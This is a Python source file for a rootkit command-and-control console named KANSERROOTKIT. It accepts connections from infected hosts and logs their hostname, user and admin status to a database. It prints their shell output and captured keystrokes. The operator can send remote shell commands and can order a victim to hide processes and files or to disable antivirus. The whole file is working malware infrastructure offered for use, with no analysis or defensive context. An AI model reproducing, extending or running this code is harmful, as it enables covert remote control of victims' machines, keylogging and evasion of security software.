#!/usr/bin/env python3
import socket, threading, json, time, os, sys, base64, sqlite3
from datetime import datetime
R, G, Y, B, W = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
def clear(): os.system("cls")
def ts(): return datetime.now().strftime("%H:%M:%S")
C2_HOST, C2_PORT = "0.0.0.0", 8888

class RootkitCli:
    def __init__(self):
        self.bots, self.selected, self.running = {}, None, True
        self.db = sqlite3.connect("kanserrootkit.db", check_same_thread=False)
        self.db.execute("CREATE TABLE IF NOT EXISTS bots (id TEXT, hostname TEXT, ip TEXT, os TEXT, user TEXT, admin INTEGER, first TEXT, last TEXT)")
        self.db.commit()
    def _srv(self):
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((C2_HOST, C2_PORT)); s.listen(50)
        print(f"{G}[{ts()}] Rootkit C2 on {C2_HOST}:{C2_PORT}{W}")
        while self.running:
            try:
                s.settimeout(1); c, a = s.accept()
                threading.Thread(target=self._h, args=(c, a), daemon=True).start()
            except socket.timeout: continue
            except: break
        s.close()
    def _h(self, c, a):
        try:
            d = c.recv(8192).decode(errors="ignore")
            msg = json.loads(base64.b64decode(d).decode())
        except: c.close(); return
        bid = msg.get("id","?"); info = msg.get("info",{})
        admin_flag = info.get("admin", False)
        self.bots[bid] = {"c": c, "addr": a[0], **info}
        self.db.execute("INSERT OR REPLACE INTO bots VALUES (?,?,?,?,?,?,datetime('now'),datetime('now'))", (bid, info.get("hostname",""), a[0], info.get("os",""), info.get("user",""), 1 if admin_flag else 0))
        self.db.commit()
        st = f"{G}ADMIN{W}" if admin_flag else f"{Y}USER{W}"
        print(f"{G}[{ts()}] [+] RK: {bid} ({a[0]}) [{st}]{W}")
        buf = ""
        while self.running:
            try:
                c.settimeout(1); d = c.recv(65536).decode(errors="ignore")
                if not d: break
                buf += d
                try:
                    resp = json.loads(base64.b64decode(buf).decode()); buf = ""
                    tp = resp.get("type","")
                    if tp == "shell": print(f"{B}[{bid}] {resp.get('data','')}{W}")
                    elif tp == "key": print(f"{Y}[KEY:{bid}] {resp.get('key','')}{W}")
                except: pass
                self.db.execute("UPDATE bots SET last=datetime('now') WHERE id=?", (bid,)); self.db.commit()
            except socket.timeout: continue
            except: break
        c.close()
        if bid in self.bots: del self.bots[bid]
        print(f"{R}[{ts()}] [-] RK: {bid}{W}")
    def _send(self, bid, cmd, data=""):
        if bid in self.bots:
            try: self.bots[bid]["c"].send(base64.b64encode(json.dumps({"cmd":cmd,"data":data}).encode())); return True
            except: pass
        return False
    def _cmd_loop(self):
        clear()
        print(f"{R}=== KANSERROOTKIT C2 CLI v1.0 ==={W}")
        print("list | select <id> | shell <id> <cmd> | hide_proc <id> <pid> | hide_file <id> <path> | disable_av <id> | exit\n")
        while self.running:
            try:
                raw = input(f"{G}ROOTKIT>{W} ").strip()
                if not raw: continue
                p = raw.split()
                if p[0] == "help": print("list | select <id> | shell <id> <cmd> | hide_proc <id> <pid> | hide_file <id> <path> | disable_av <id> | exit")
                elif p[0] == "exit": self.running = False; break
                elif p[0] == "list":
                    if not self.bots: print(f"{Y}No rootkits{W}")
                    else:
                        for bid, info in self.bots.items():
                            mk = f"{R}*{W}" if bid == self.selected else " "
                            adm = f"{G}ADMIN{W}" if info.get("admin") else f"{Y}USER{W}"
                            print(f"  {mk} {bid} | {info.get('addr','?')} | {info.get('hostname','?')} | [{adm}]")
                elif p[0] == "select" and len(p) > 1:
                    if p[1] in self.bots: self.selected = p[1]; print(f"{G}Selected: {p[1]}{W}")
                    else: print(f"{R}Not found: {p[1]}{W}")
                elif p[0] == "shell" and len(p) >= 3: self._send(p[1], "shell", raw.split(" ", 2)[2])
                elif p[0] == "hide_proc" and len(p) >= 3:
                    self._send(p[1], "hide_proc", p[2])
                    print(f"{G}[{ts()}] hide_proc -> {p[1]}:{p[2]}{W}")
                elif p[0] == "hide_file" and len(p) >= 3:
                    path = raw.split(" ", 2)[2]; self._send(p[1], "hide_file", path)
                    print(f"{G}[{ts()}] hide_file -> {p[1]}:{path}{W}")
                elif p[0] == "disable_av" and len(p) >= 2:
                    self._send(p[1], "disable_av")
                    print(f"{G}[{ts()}] disable_av -> {p[1]}{W}")
                else: print(f"{R}Unknown: {p[0]}{W}")
            except KeyboardInterrupt: self.running = False; break
            except: print(f"{R}Error{W}")
    def run(self):
        threading.Thread(target=self._srv, daemon=True).start()
        self._cmd_loop(); print(f"{Y}[{ts()}] Rootkit C2 stopped{W}")

if __name__ == "__main__":
    try: RootkitCli().run()
    except KeyboardInterrupt: pass
